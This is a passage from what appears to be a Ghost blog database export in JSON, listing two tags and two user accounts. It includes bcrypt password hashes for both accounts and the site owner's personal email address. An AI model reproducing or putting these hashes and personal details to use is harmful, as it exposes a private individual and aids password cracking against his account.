Started","slug":"getting-started","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d6eb8f7992f0652efb50f7e","name":"Proxmark3","slug":"proxmark3","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-08-09T17:57:07.000Z","updated_at":"2018-08-09T17:57:07.000Z"}],"users":[{"id":"1","name":"Brandon Hinkel","slug":"brandon","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$ZfqCdWQKFPhWVJSMZ2PH6.i5TdCR4a6Ifk3k/C9TLcNMArsXseB.6","email":"brandon.hinkel@gmail.com","profile_image":"//www.gravatar.com/avatar/074d0513ea2ed615f7c62062ad77f1a4?s=250&d=mm&r=x","cover_image":null,"bio":null,"website":null,"location":null,"facebook":null,"twitter":null,"accessibility":"{\"nightShift\":true}","status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":"[\"getting-started\"]","last_seen":"2020-02-13T14:57:57.000Z","created_at":"2019-07-11T15:24:36.000Z","updated_at":"2020-02-13T14:57:57.000Z"},{"id":"5951f5fca366002ebd5dbef7","name":"Ghost","slug":"ghost","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$9PfByH6aWEpOn3D8ABa/hOQnXU7.E3ZalFcJk3BZE1PP7QNzF0sAi","email":"ghost-author@example.com","profile_image":"https://static.ghost.org/v2.0.0/images/ghost.png","cover_image":null,"bio":"You can delete this user to remove all the welcome posts","website":"https://ghost.org","location":"The Internet","facebook":"ghost","twitter":"tryghost","accessibility":null,"status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"}],"webhooks":[]}}]}